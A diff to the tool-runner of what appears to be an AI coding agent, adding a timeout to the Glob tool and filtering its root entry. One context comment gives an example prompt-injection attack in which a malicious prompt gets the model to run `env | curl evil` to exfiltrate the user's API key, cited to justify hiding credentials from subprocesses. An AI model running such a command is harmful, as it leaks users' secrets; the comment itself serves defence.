@@ -55,6 +55,24 @@ const BASH_TIMEOUT_CEILING_MS = 600_000
 const GLOB_MAX_MATCHES = 10_000
 
 /**
+ * Wall-clock bound on a Glob walk. Matches the 30s `executeBash` timeout the
+ * shell implementation had — dropping the subprocess dropped its kill, and
+ * `fs.glob` honours no AbortSignal of its own.
+ *
+ * Read per call, not at module load, and overridable via
+ * `CHROXY_GLOB_TIMEOUT_MS`. That knob is what lets the timeout be PROVEN: a
+ * test asserting a 30s bound by waiting 30s does not get written, and a test
+ * that only checks the happy path is a guard whose success and whose absence
+ * look identical (docs/false-safety-guards.md). A very large monorepo wanting
+ * a longer budget is the secondary use.
+ */
+const GLOB_TIMEOUT_DEFAULT_MS = 30_000
+function globTimeoutMs() {
+  const raw = Number(process.env.CHROXY_GLOB_TIMEOUT_MS)
+  return Number.isFinite(raw) && raw >= 0 ? raw : GLOB_TIMEOUT_DEFAULT_MS
+}
+
+/**
  * Env vars the model must NEVER see in a Bash subprocess. Centrally
  * the BYOK API key — if a malicious prompt induces the model to run
  * `env | curl evil`, the model exfiltrates the user's API credentials
@@ -295,19 +313,54 @@ async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
   // which the traversal already knows, so the confinement below can single out
   // symlink entries for a realpath WITHOUT paying a syscall on every ordinary
   // file.
+  //
+  // `fs.glob` IGNORES an AbortSignal (measured on Node 22 — passing an
+  // already-aborted one completes normally), and dropping `executeBash` also
+  // dropped its 30s kill. So the bound is rebuilt here: a flag the loop checks
+  // at each yield, plus a race so the TOOL CALL returns on time even when the
+  // walk is between yields. The walk itself can only stop at a yield, which is
+  // stated rather than papered over.
   const files = []
-  try {
+  // ONE timer sets the flag and releases the race, so the two cannot resolve
+  // in either order — a second, independent timer would let the race finish
+  // before `stop` was assigned and report success on a timed-out walk.
+  let stop = null
+  let releaseDeadline
+  const deadlineReached = new Promise((resolve) => { releaseDeadline = resolve })
+  const timeoutMs = globTimeoutMs()
+  const deadline = setTimeout(() => { stop = 'timed out'; releaseDeadline() }, timeoutMs)
+  deadline.unref?.()
+  const collect = (async () => {
     for await (const entry of fsGlob(pattern, { cwd: realRoot, withFileTypes: true })) {
-      if (signal?.aborted) return { content: 'Glob interrupted', isError: true }
-      files.push({
-        path: relative(realRoot, join(entry.parentPath, entry.name)),
-        isSymlink: entry.isSymbolicLink(),
-      })
+      if (stop) break
+      if (signal?.aborted) { stop = 'interrupted'; break }
+      const rel = relative(realRoot, join(entry.parentPath, entry.name))
+      // `**` yields the search root itself, which `relative()` renders as ''.
+      // The root is not a match; emitting it produced a blank first line (and
+      // a bare '' on an empty workspace) that the shell implementation never
+      // did.
+      if (rel === '') continue
+      files.push({ path: rel, isSymlink: entry.isSymbolicLink() })
       if (files.length >= GLOB_MAX_MATCHES) break
     }
+  })()
+  // Attach a catch BEFORE the race: if the walk rejects after the deadline has
+  // already settled it, the rejection would otherwise be unhandled.
+  let walkError = null
+  collect.catch((err) => { walkError = err })
+  try {
+    await Promise.race([collect, deadlineReached])
   } catch (err) {
-    return { content: `Glob failed: ${err?.message || String(err)}`, isError: true }
+    walkError = err
   }
+  clearTimeout(deadline)
+  if (walkError) {
+    return { content: `Glob failed: ${walkError?.message || String(walkError)}`, isError: true }
+  }
+  if (stop === 'timed out') {
+    return { content: `Glob timed out after ${timeoutMs}ms`, isError: true }
+  }
+  if (stop === 'interrupted') return { content: 'Glob interrupted', isError: true }
   const kept = await confineGlobMatches(files, realRoot, cwdRealCache, cwdCacheTtl)
   // A withheld match is reported as no match, with no count and no marker.
   // Anything that distinguishes "matched, but outside" from "matched nothing"
